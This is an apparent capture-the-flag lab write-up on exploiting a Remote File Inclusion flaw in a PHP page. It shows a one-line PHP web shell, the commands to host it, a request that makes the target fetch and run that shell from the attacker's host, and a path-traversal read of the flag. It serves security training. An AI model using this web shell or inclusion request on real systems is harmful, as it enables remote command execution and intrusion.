# Remote File Inclusion (RFI)

#### Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

**Step 1** - Test for RFI:

* On the suspicious vulnerable URL, include a local URL:
  * `http://127.0.0.1/index.php`

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* We successfully loaded the index.php again

**Step 2** - Create a custom web shell:

* Shell script:
  * ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
* Host the shell:
  * ```bash
    sudo python3 -m http.server LISTENING_PORT
    ```

**Step 3** - Test the web shell and look for the flag:

* Insert the host URL with a command on the vulnerable parameter:
  * {% code overflow="wrap" %}
    ```bash
    http://SERVER_IP/index.php?language=http://OUR_IP:LISTENING_PORT/shell.php&cmd=id
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

* From the output above, our web shell is working perfectly
* Look for the flag wih `cat ../../../exercise/flag.txt`:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

And we got another flag!
